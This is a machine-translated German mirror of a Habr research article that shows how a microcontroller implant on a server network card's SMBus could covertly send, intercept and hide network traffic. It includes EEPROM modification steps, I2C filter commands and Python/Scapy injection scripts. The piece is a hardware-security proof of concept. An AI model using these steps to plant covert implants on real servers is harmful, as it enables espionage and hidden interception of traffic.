<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëï üß£ üë©‚Äçüë©‚Äçüëß‚Äçüë¶ Machen Sie Ihr eigenes Implantat f√ºr die Elektronik üïô üëêüèΩ üôåüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die Geschichte von Bloomberg, dass einige Implantate angeblich auf den Motherboards installiert waren [die Chinesen verwendeten einen Mikrochip zur St...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Machen Sie Ihr eigenes Implantat f√ºr die Elektronik</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/429190/"><img src="https://habrastorage.org/webt/0b/ft/fa/0bftfawizhuqj5ah4gu_9z1tzak.png"><br><br>  Die Geschichte von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bloomberg,</a> dass einige Implantate angeblich auf den Motherboards installiert waren [die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Chinesen verwendeten einen Mikrochip zur Steuerung amerikanischer Computer</a> ], blieb nicht unbemerkt.  Danach teilten viele Menschen Ideen √ºber die M√∂glichkeit, solche Implantate herzustellen (ihre gesch√§tzte Gr√∂√üe, F√§higkeiten oder Nachweismethode). <br><br>  Einige Tage sp√§ter ver√∂ffentlichte das <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bloomberg-</a> Magazin einen Artikel mit zus√§tzlichen Beweisen.  Folgendes hat unser Interesse geweckt: <br><blockquote>  Der legale Server hat Nachrichten auf die eine und das Implantat auf die andere Weise gesendet, aber es schien, dass der gesamte Datenverkehr von einem vertrauensw√ºrdigen Server kam. </blockquote><br><a name="habracut"></a><br>  Es gibt M√∂glichkeiten, direkt vom Motherboard aus mit der Netzwerkkarte zu interagieren.  Mehrere Personen haben angegeben, dass Sie mit BMC (Baseboard Management Controller - eine Komponente, die zus√§tzlich zum Hauptkanal den Zugriff auf den Server erm√∂glicht) spielen k√∂nnen, mit der das Implantat den BMC steuern und Zugriff auf die Netzwerkkarte erhalten kann.  Aber wie funktioniert das in der Praxis?  Mal sehen, ob wir das reproduzieren k√∂nnen. <br><br><h2>  Ausgangsposition </h2><br>  Schauen wir uns die m√∂glichen Schnittstellen zwischen der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Netzwerkkarte</a> und dem BMC an.  Eines der Hauptprotokolle f√ºr die Arbeit an einem dedizierten Kanal ist die intelligente IPMI-Plattformverwaltungsschnittstelle. <br><br><h3>  IPMI </h3><br>  Laut Wikipedia ist IPMI ‚Äûeine intelligente Plattformverwaltungsschnittstelle zur autonomen √úberwachung und Verwaltung von Funktionen, die direkt in die Hardware und Firmware von Serverplattformen integriert sind.  Die Hauptmerkmale von IPMI sind √úberwachung, Wiederherstellung von Verwaltungsfunktionen, Protokollierung und Inventarisierung, die unabh√§ngig von Prozessor, BIOS und Betriebssystem verf√ºgbar sind.  Plattformverwaltungsfunktionen sind m√∂glicherweise auch dann verf√ºgbar, wenn das System ausgeschaltet ist. ‚Äú  Sehr √§hnlich zu dem, was wir brauchen. <br><br>  Das folgende Flussdiagramm zeigt einen m√∂glichen Projektimplementierungspfad: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/33c/3e3/2f6/33c3e32f69cf311114455fe1fb98d5a1.png"><br><br>  IPMI definiert tats√§chlich zwei Seitenbandkan√§le f√ºr die Netzwerkkarte: SMBus und NC-SI.  NC-SI ist ein SMBus-Ersatz auf dem neuesten Stand der Technik, der verbesserte Daten√ºbertragungsgeschwindigkeiten und andere neue Funktionen unterst√ºtzt.  Das Problem ist, dass sie mehr Signale ben√∂tigt (ungef√§hr 10) und es viel schwieriger ist, in ihre Arbeit einzugreifen, wenn wir mit einem Implantat arbeiten.  Lassen Sie uns zun√§chst auf SMBus eingehen. <br><br><h3>  SMBus </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SMBus</a> (System Management Bus) ist ein serielles Kommunikationsprotokoll f√ºr Stromversorgungsger√§te.  Einseitiger einfacher Zweidrahtbus f√ºr unkomplizierte Kommunikation.  Wird am h√§ufigsten in Computern verwendet, um das Motherboard mit einer Stromquelle zu verbinden und Anweisungen ein- und auszuschalten.  Basierend auf dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">I <sup>2</sup> C-</a> Bus, der √ºblicherweise in Mikrocontrollern verwendet wird.  Die Schnittstelle ben√∂tigt nur zwei Signale (Taktfrequenz und Daten), und das dritte Signal ist ein Interrupt.  Perfekt f√ºr das Implantatspielprotokoll. <br><br><h2>  Erster Kontakt </h2><br>  Sie m√ºssen schlau sein und mit BMC keinen Zugriff auf das Motherboard haben.  Bei der Untersuchung der technischen Eigenschaften der Server-Motherboards stellten wir fest, dass einige von ihnen den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Intel 82574L-</a> Chip verwenden.  Der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Dokumentation</a> zufolge bietet es die "SMBus Advanced Pass-Through-Schnittstelle" - genau das, was Sie brauchen.  Und das Beste ist, dass es im PCI-E-Kartenformat erh√§ltlich ist. <br><br><h3>  SMBus-Zugang </h3><br>  Wir sind in den Laden gegangen und haben jetzt <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Intel EXPI9301CTBLK-</a> Karten mit dem 82574L-Chip.  Was jetzt? <br><br>  Die Dokumentation kann SMB_DAT und SMB_ALRT_N verfolgen.  Gl√ºcklicherweise stellte sich heraus, dass sie alle an den Kontaktfl√§chen verf√ºgbar waren.  Alles scheint ganz einfach zu sein. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e71/6a5/467/e716a54673d59b3aec0c9e34765ef734.jpg"><br>  <i>NIC-Platine.</i>  <i>Oben links - EEPROM, oben rechts - Anschluss f√ºr SMBus [ALRT | CLK | DAT].</i>  <i>Bitte beachten Sie, dass R39 und R40 abgedichtet sind, was den Zugriff auf SMBus f√ºr den PCIe-Anschluss verhindert.</i> <br><br>  Wir haben die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">I <sup>2</sup> C-Sonde angeschlossen</a> und den SMBus gescannt, aber nichts N√ºtzliches gez√§hlt.  Die Dokumentation besagt, dass SMBus nur aktiviert ist, wenn ein bestimmtes Bitregister gesetzt ist.  Dieser Wert wird aus dem EEPROM geladen.  Es ist Zeit, tiefer zu graben. <br><br><h3>  Aktivieren Sie den Zugriff auf SMBus </h3><br>  Die Dokumentation hilft uns wieder.  Der Zugriff auf SMBus wird durch den Wert des aus dem NIC-EEPROM geladenen Registers bestimmt.  Gl√ºcklicherweise kann das EEPROM mit Flashrom gelesen werden.  Durch Speichern des Inhalts des EEPROM k√∂nnen wir die Werte analysieren und √§ndern: <br><br> <code>&gt; ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump <br> flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64) <br> flashrom is free software, get the source code at https://flashrom.org <br> <br> Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). <br> Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi. <br> Reading flash... done.</code> <br> <br>  Nach der NVM-Karte (Kapitel 6.1 der Dokumentation) zu urteilen, ist es klar, dass wir zwei Werte √§ndern m√ºssen: <br><br><ul><li>  Init Control Word 2 [MNGM] (Datenblatt Kapitel 6.1.1.6) </li><li>  Kompatibilit√§t [ASF SMBus Connected] (Datenblatt Kapitel 6.1.2.1.1) </li><li>  Kompatibilit√§t [SMBus Connected] (Datenblatt Kapitel 6.1.2.1.1) </li></ul><br>  Es muss nur ber√ºcksichtigt werden, dass im EEPROM Daten im Little-Endian-Format gespeichert sind. <br><br>  Danach m√ºssen wir uns noch mit dem Wert von Checksum befassen.  In Kapitel 6.1.2.11 hei√üt es, dass die Summe aller W√∂rter im Bereich [0x00-0x40] 0xBABA sein sollte.  Ein bisschen Python hilft uns dabei, die richtige Pr√ºfsumme zu berechnen: <br><br> <code>import struct <br> data = open('/tmp/flash.mod', 'rb').read() <br> tot = 0 <br> for i in range(0x3f): <br> tot = (tot + struct.unpack('&lt;H',data[2*i:(2*i)+2])[0]) &amp; 0xffff <br> <br> print("Checksum word must be : " + hex(0xbaba-tot)) <br> #Checksum word must be : 0x9efb</code> <br> <br>  Und schlie√ülich alle unsere √Ñnderungen f√ºr EEPROM: <br><br> <code>&lt; 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F....... <br> &gt; 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F....... <br> &lt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z. <br> &gt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z. <br> <br> &lt; 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0..... <br> &gt; 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....</code> <br> <br>  Nachdem wir √Ñnderungen vorgenommen und das EEPROM geflasht haben, haben wir eine I <sup>2</sup> C-Sonde angeschlossen und: <br><br> <code>i2c1&gt; scan <br> Device found at address 0x49 <br> i2c1&gt;</code> <br> <br>  Die Adresse I <sup>2</sup> C ist in sieben Bits codiert, die Adresse, die wir ben√∂tigen, wird als 0x49 &lt;&lt; 1 = 0x92 erhalten. <br><br>  Jetzt haben wir ein Arbeitsdiagramm f√ºr unser Implantat.  Wir k√∂nnen Befehle an die Netzwerkkarte senden: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/13c/bfc/f14/13cbfcf14267b6055c8dc5760b59e2fd.jpg"><br><br><h2>  Informationen erhalten </h2><br>  Wie Sie vielleicht vermutet haben, haben wir die Dokumentation weiter gelesen und speziell vorbereitete Befehle an die Netzwerkkarte gesendet, um zu √ºberpr√ºfen, ob alles wie erwartet funktioniert hat. <br><br>  In der Dokumentation wird in Kapitel 8.4.4 alles beschrieben, was Sie √ºber das Transaktionsformat wissen m√ºssen.  Der einzige Unterschied besteht darin, dass wir die PEC nicht berechnen m√ºssen (Pr√ºfsumme f√ºr SMBus, die f√ºr jedes Paket berechnet wird).  Zum Beispiel k√∂nnen wir den CMD-Befehl in der folgenden Reihenfolge an die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">SLAVE-</a> Adresse senden: <br><br> <code>[START] [@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] ) [STOP]</code> <br> <br>  [START] und [STOP] sind die durch I <sup>2</sup> C definierten START- und STOP-Bedingungen. <br><br>  Der Befehl zum Lesen der MAC-Adresse (beschrieben in Kapitel 8.8.2.3) lautet beispielsweise 0xD4.  Wir senden den Befehl im I <sup>2</sup> C-Modus an SMBus: <br><br> <code>[START] [0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]</code> <br> <br>  Bei der √úbertragung an Hydrabus-Teams gilt Folgendes: <br><br> <code>i2c1&gt; [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ] <br> I2C START <br> WRITE: 0x92 ACK 0xD4 ACK &lt;== [NIC address] [command] <br> I2C START &lt;== Switch state <br> WRITE: 0x92 ACK &lt;== [NIC address] <br> 07 D4 | .. &lt;== Read [length] [header] <br> 68 05 CA 89 B2 2E | h..... &lt;== Read MAC address bytes <br> NACK <br> I2C STOP</code> <br> <br>  Und ja, wir bekommen unsere MAC-Adresse! <br><br><h2>  Ein Implantat herstellen </h2><br>  Nachdem Sie nun wissen, wie Sie mit der Netzwerkkarte kommunizieren k√∂nnen, wollen wir sehen, wie Sie diesen Kanal verwenden k√∂nnen, um den Netzwerkverkehr zu stehlen und Daten √ºber das Netzwerk zu senden.  Kapitel 8 der Dokumentation beschreibt alles, was Sie dazu ben√∂tigen. <br><br><h3>  Pakete senden </h3><br>  Beschrieben in den Kapiteln 8.6 und 8.8.1.  Wir k√∂nnen einfach einen Ethernet-Frame mit Befehlen erstellen.  Hier ist ein Beispielskript f√ºr <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hydrabus</a> oder <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bus Pirate</a> zum Senden eines Pakets: <br><br> <code>import serial <br> import struct <br> from scapy.all import * <br> <br> ser = serial.Serial('/dev/ttyACM0',115200) <br> <br> def send_frame(pkt): <br> # Define the frame size <br> pktlen = struct.pack("B", len(pkt)) <br> <br> # Define the data length to be sent <br> fulllen = struct.pack("&gt;h", len(pkt)+3) <br> <br> # I2C write-then-read. Send frame + SMBus header, receive 0 <br> ser.write('\x08'+fulllen+'\x00\x00') <br> ser.write("\x92\xc4"+pktlen+pkt) <br> <br> # If packet has been sent successfully <br> if ser.read(1) == '\x01': <br> print "Send OK" <br> else: <br> print "Error sending" <br> ser.write('\x00') <br> ser.write('\x00') <br> ser.write('\x0F\n') <br> quit() <br> <br> # Open Hydrabus in binary mode <br> for i in xrange(20): <br> ser.write("\x00") <br> if "BBIO1" not in ser.read(5): <br> print "Could not get into binary mode" <br> quit() <br> <br> # Switch to I2C mode <br> ser.write('\x02') <br> if "I2C1" not in ser.read(4): <br> print "Cannot set I2C mode" <br> quit() <br> <br> #Create the frame to send <br> p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP() <br> <br> #Send the frame <br> send_frame(str(p)) <br> <br> # Return to main binary mode <br> ser.write('\x00') <br> #reset to console mode <br> ser.write('\x0F\n')</code> <br> <br>  Nach dem Ausf√ºhren des Skripts k√∂nnen Sie sehen, dass das Paket mit dem Implantat von der Maschine kommt, und am interessantesten ist, dass der Server selbst dieses Paket √ºberhaupt nicht sieht: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ea1/947/4f2/ea19474f2a801afddb732624fa1f3d40.png"><br>  <i>Tcpdump vom Computer des Angreifers links, Server rechts</i> <br><br><h3>  Pakete lesen </h3><br><h4>  Filtern </h4><br>  Um herauszufinden, welche Frames an SMBus gesendet werden sollen, verwendet die Netzwerkkarte Steuerfilter.  Sie ordnen den Datenverkehr aus dem Netzwerk zu und leiten ihn entweder an PCIe oder an SMBus oder sowohl dort als auch dort weiter.  Dies gibt uns aus unserer Sicht gro√üe Flexibilit√§t: <br><br><ul><li>  Sie k√∂nnen den Datenverkehr verfolgen, indem Sie einen Filter festlegen, der ihn scannt und an PCIe und SMBus umleitet. </li><li>  Sie k√∂nnen den Datenverkehr verschwinden lassen, indem Sie ihn nur an SMBus weiterleiten. </li><li>  Sie k√∂nnen mit dem Implantat einen versteckten Kanal erstellen, der f√ºr den Server nicht sichtbar ist. </li></ul><br>  Am interessantesten ist, dass der Filter so konfiguriert werden kann, dass er verschiedene Rahmenelemente verfolgt: <br><br><ul><li>  UDP / TCP-Port </li><li>  VLAN </li><li>  IPv4 - IPv6 </li><li>  MAC-Adresse </li><li>  ... </li></ul><br>  (Eine vollst√§ndige Liste finden Sie in Kapitel 8.4.2.1.) <br><br>  Es stehen sieben unabh√§ngige MDEF-Filter [0: 6] zur Verf√ºgung, von denen jeder so konfiguriert werden kann, dass der entsprechende Datenverkehr √ºber SMBus √ºber das MANC2H-Register an PCIe umgeleitet wird (weitere Informationen siehe Kapitel 8.4.3). <br><br><h4>  Implementierung </h4><br>  Es stellte sich als ziemlich schwierig heraus, alles richtig einzurichten. Wir haben viele verschiedene Kombinationen ausprobiert, damit der Filter funktioniert.  Gl√ºcklicherweise gab uns der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hinweis</a> zur Intel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">-Anwendung</a> mehr Details dar√ºber, wie Filter so ausgef√ºhrt werden, wie wir es ben√∂tigen. <br><br>  Mit unserer I <sup>2</sup> C-Sonde k√∂nnen wir all dies mit vier Befehlen konfigurieren: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  MDEF[0]   ,   UDP/664  UDP/623 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ] <br> //  MANC2H      <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Wie in Kapitel 8.8.1.3 beschrieben, m√ºssen mehrere Bits gesetzt werden, um den Datenempfang zu erm√∂glichen und Frames an unser Implantat zur√ºckzusenden.  Wir haben uns f√ºr die SMBus-Warnung entschieden, da die Netzwerkkarte bei anderen Modellen asynchrone Anforderungen an SMBus senden kann (Einzelheiten siehe Kapitel 8.4.5). <br><br><h4>  Frames lesen </h4><br>  Da wir die SMBus-Warnmethode verwendet haben, mussten wir warten, bis das Signal SMB_ALRT_N ausgeschaltet wurde, bevor wir den Befehl TCO-Paket empfangen senden.  Wenn wir zu lange warten, wird das Paket von der Netzwerkkarte abgelehnt. <br><br>  Um das Diagramm nur zu veranschaulichen, senden wir regelm√§√üig Frames und Lesebefehle - nur um zu best√§tigen, dass dieses Prinzip funktioniert.  Das Schema sieht folgenderma√üen aus: <br><br><ul><li>  Ein Server mit einem Implantat verf√ºgt √ºber Filter, die den Datenverkehr mit UDP / 623 √ºberwachen (Kapitel 3.6.1.2). </li><li>  Das Implantat wird mit Hydrabus simuliert. </li><li>  Ein anderer Server sendet mithilfe des Scapy-Skripts Pakete, die unter den Filter fallen: </li></ul><br> <code>from scapy.all import * <br> p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD" <br> while(1):sendp(p)</code> <br> <br>  Es stellt sich etwas Interessantes heraus: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e03/407/a68/e03407a6872fbeda15ad73fa32c87257.png"><br><br>  Links liest SMBus den Frame, die Frame-Daten sind unten dargestellt.  Auf der rechten Seite zeigt tcpdump, das auf einem Server mit einem Implantat ausgef√ºhrt wird, keine eingehenden Frames an. <br><br><h4>  Rahmenrelais </h4><br>  Durch √Ñndern des MANC2H-Registers ist es m√∂glich, den an SMBus und PCIe gesendeten Datenverkehr korrekt auf dem Server anzuzeigen.  Erstellen Sie beispielsweise einen Abfangfilter, der auf UDP / 161-Verkehr (SNMP) reagiert und ihn an SMBus und PCIe sendet: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  - 0   161 (0xa1) <br> [ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ] <br> //  MDEF[0]   ,   - 0 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ] <br> //  MANC2H     MDEF[0]  PCIe <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Durch Aktivieren von Filtern k√∂nnen wir eine SNMP-Anforderung an den Server mit dem Implantat senden und das Paket anzeigen, das das Implantat abgefangen hat.  Gleichzeitig antwortet der Server auf die Anfrage - was bedeutet, dass das Paket korrekt an SMBus und PCIe umgeleitet wurde: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e32/d3b/281/e32d3b281a556bd1bcdebe86498a2dc1.png"><br>  <i>Oben ist eine abgefangene SNMP-Anfrage vom Implantat.</i>  <i>Unten - Die SNMP-Anforderung hat den Server erreicht.</i> <br><br><h2>  Schlussfolgerungen </h2><br>  Wir haben eine m√∂gliche Methode zur Einf√ºhrung eines kleinen und kosteng√ºnstigen Mikrocontrollers als Implantat auf NIC-Ebene beschrieben.  Ein solches Implantat ben√∂tigt mindestens vier Kontakte (Vcc, GND, CLK, DAT) und kann die Serverkarte steuern.  Unter seinen Merkmalen: <br><br><ul><li>  Abwarten auf eingehenden Netzwerkverkehr zum Server. </li><li>  Empfangen von Befehlen aus dem Netzwerk ohne Kenntnis des Servers. </li><li>  Daten√ºbertragung √ºber das Netzwerk ohne Kenntnis des Servers. </li></ul><br>  In unserem Beispiel wurde der Einfachheit halber Hydrabus als Schnittstelle f√ºr den I <sup>2</sup> C / SMBus verwendet, dies kann jedoch genauso einfach auf einem kleinen Mikrocontroller durchgef√ºhrt werden, z. B. ATtiny85 (es entspricht etwa der Gr√∂√üe eines EEPROM f√ºr NIC). <br><br>  Im wirklichen Leben w√§re der Zugang zu einem solchen Implantat jedoch nur f√ºr SMBus m√∂glich.  Abh√§ngig vom Motherboard-Schema ist m√∂glicherweise nur dieses Ger√§t verf√ºgbar. Eine Interaktion mit dem Server-Betriebssystem ist dann nicht m√∂glich.  Wenn die vollst√§ndige Kontrolle √ºber das Betriebssystem erforderlich ist, √§ndern Sie am besten den BMC-Code, da dieser bereits Zugriff auf alle interessanten Busse hat und keine sichtbaren Spuren auf dem Motherboard hinterl√§sst. <br><br>  Ein weiterer Nachteil eines solchen Implantats besteht darin, dass es Daten mit Geschwindigkeiten in der Gr√∂√üenordnung von 100 Kb / s √ºbertragen kann, was f√ºr eine vollst√§ndige Untersuchung des Verkehrs nicht ausreicht.  Dar√ºber hinaus kann das Implantat nur den vom Netzwerk kommenden Datenverkehr abfangen.  Infolgedessen scheint diese L√∂sung im Vergleich zu den Anstrengungen, die f√ºr ihre Implementierung in der Zielausr√ºstung erforderlich sind, unwirksam zu sein. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de429190/">https://habr.com/ru/post/de429190/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de429180/index.html">Geh zu goto</a></li>
<li><a href="../de429182/index.html">K√ºnstliche Intelligenz stie√ü auf eine Barriere des Verstehens</a></li>
<li><a href="../de429184/index.html">Online-Medien brechen vorhersehbar die Kette √ºber Oumuamua- und Harvard-Gelehrte</a></li>
<li><a href="../de429186/index.html">@ Pythonetc Oktober 2018</a></li>
<li><a href="../de429188/index.html">√úbersicht √ºber PICASO 3D Designer XL</a></li>
<li><a href="../de429192/index.html">Diese neuen Tricks k√∂nnen Deepfake-Videos immer noch √ºberlisten.</a></li>
<li><a href="../de429194/index.html">7 Bibliotheken f√ºr die Android-Entwicklung auf Kotlin</a></li>
<li><a href="../de429196/index.html">iOS Runtime Mobile Exploration mit Objection oder Hack unserer eigenen Anwendung</a></li>
<li><a href="../de429198/index.html">Das Kernel-Bridge-Framework: Bridge in Ring0</a></li>
<li><a href="../de429202/index.html">Teure Kurse: lohnt es sich?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>